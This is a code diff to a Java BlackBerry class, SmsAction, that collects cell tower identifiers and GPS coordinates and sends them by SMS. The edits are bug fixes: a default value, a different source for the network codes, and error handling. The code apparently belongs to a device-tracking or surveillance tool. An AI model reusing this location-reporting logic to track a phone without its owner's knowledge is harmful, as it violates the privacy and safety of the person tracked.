@@ -79,7 +79,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
     
             switch (type) {
                 case TYPE_TEXT:
-                    text = params.getString(Messages.getString("9.33")); //$NON-NLS-1$
+                    text = params.getString(Messages.getString("9.33"),"No Text"); //$NON-NLS-1$
                     break;
                 case TYPE_LOCATION:
                     // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
@@ -172,14 +172,13 @@ public final class SmsAction extends SubAction implements LocationObserver {
                 // http://en.wikipedia.org/wiki/Mobile_Network_Code
                 final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();
 
-                final int mcc = Integer.parseInt(Integer.toHexString(cellinfo
-                        .getMCC()));
-
-                final int mnc = cellinfo.getMNC();
+                int mcc = Utils.hex(RadioInfo.getMCC(RadioInfo
+                        .getCurrentNetworkIndex()));
+                int mnc = RadioInfo.getMNC(RadioInfo.getCurrentNetworkIndex());
+                
                 final int lac = cellinfo.getLAC();
                 final int cid = cellinfo.getCellId();
-
-                final int bsic = GPRSInfo.getCellInfo().getBSIC();
+                final int bsic = cellinfo.getBSIC();
 
                 final StringBuffer mb = new StringBuffer();
                 mb.append(Messages.getString("9.3") + mcc); //$NON-NLS-1$
@@ -240,6 +239,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
     }
 
     public void newLocation(Location loc) {
+        try{
         //#ifdef DEBUG
         debug.trace("newLocation"); //$NON-NLS-1$
         //#endif
@@ -260,13 +260,18 @@ public final class SmsAction extends SubAction implements LocationObserver {
             debug.error("Cannot get QualifiedCoordinates"); //$NON-NLS-1$
             //#endif                        
             errorLocation(false);
+        }else{
+            final StringBuffer sb = new StringBuffer();
+            sb.append(Messages.getString("9.16") + qc.getLatitude() + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
+            sb.append(Messages.getString("9.18") + qc.getLongitude() + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
+    
+            sendSMS(sb.toString());
         }
-
-        final StringBuffer sb = new StringBuffer();
-        sb.append(Messages.getString("9.16") + qc.getLatitude() + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
-        sb.append(Messages.getString("9.18") + qc.getLongitude() + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
-
-        sendSMS(sb.toString());
+        }catch(Exception ex){
+            //#ifdef DEBUG
+            debug.error("newLocation: " + ex);
+            //#endif
+        }
 
     }
 
